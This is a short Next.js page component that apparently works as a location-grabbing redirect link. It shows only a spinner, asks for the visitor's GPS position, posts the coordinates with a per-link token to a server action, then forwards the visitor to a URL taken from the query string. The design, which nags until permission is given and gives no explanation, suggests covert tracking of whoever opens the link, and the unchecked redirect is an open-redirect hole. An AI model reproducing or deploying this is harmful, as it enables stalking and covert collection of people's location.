"use client";

import postGps from "@/app/action/redirect/postGps";
import Section from "@/app/components/Section";
import { useEffect, useState } from "react";

export default function Example({ searchParams, params }) {
  const redirectUrl = searchParams.url;
  const check = async () => {
    if (redirectUrl) {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            await postGps(
              position.coords.latitude,
              position.coords.longitude,
              position.coords.accuracy,
              params.token
            );

            window.location.href = redirectUrl;
            return;
          },
          (error) => {
            alert("Tolong Aktifkan Prompt Konfirmasi!");
          }
        );
      } else {
        console.error("Geolocation is not supported by this browser.");
      }
    }
  };

  useEffect(() => {
    check();
  }, []);
  return (
    <>
      <Section>
        <div className="bg-white flex justify-center h-screen">
          <span className="loading loading-spinner loading-md"></span>
        </div>
      </Section>
    </>
  );
}
